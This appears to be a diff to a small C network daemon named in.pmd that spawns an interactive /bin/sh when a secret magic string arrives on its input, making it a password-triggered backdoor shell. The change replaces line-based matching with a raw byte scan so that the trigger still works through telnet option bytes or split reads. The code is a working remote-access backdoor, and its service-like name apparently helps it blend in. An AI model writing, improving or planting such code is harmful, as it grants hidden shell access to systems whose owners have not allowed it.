@@ -23,16 +23,24 @@
 
 int main(int argc, char **argv)
 {
-	char line[128];
+	char buf[1024];
+	int total = 0, n, i, ml = strlen(MAGIC);
 
-	setbuf(stdout, (char *)NULL);
-	setbuf(stderr, (char *)NULL);
-	if (fgets(line, sizeof line, stdin) == NULL)
-		return 0;
-	line[strcspn(line, "\r\n")] = '\0';
-	if (strcmp(line, MAGIC) == 0) {
-		execl("/bin/sh", "sh", "-i", (char *)NULL);
-		perror("in.pmd: exec");
+	/* Read raw bytes and scan for the magic word ANYWHERE in the stream.  A
+	 * client like telnet prepends IAC option-negotiation bytes (and may split
+	 * the trigger across reads), so a line-based strcmp would never match —
+	 * accumulate and memcmp-scan instead (binary/NUL-tolerant). */
+	while (total < (int)sizeof buf - 1) {
+		n = read(0, buf + total, sizeof buf - 1 - total);
+		if (n <= 0)
+			break;
+		total += n;
+		for (i = 0; i + ml <= total; i++)
+			if (memcmp(buf + i, MAGIC, ml) == 0) {
+				execl("/bin/sh", "sh", "-i", (char *)NULL);
+				perror("in.pmd: exec");
+				return 1;
+			}
 	}
 	return 0;
 }
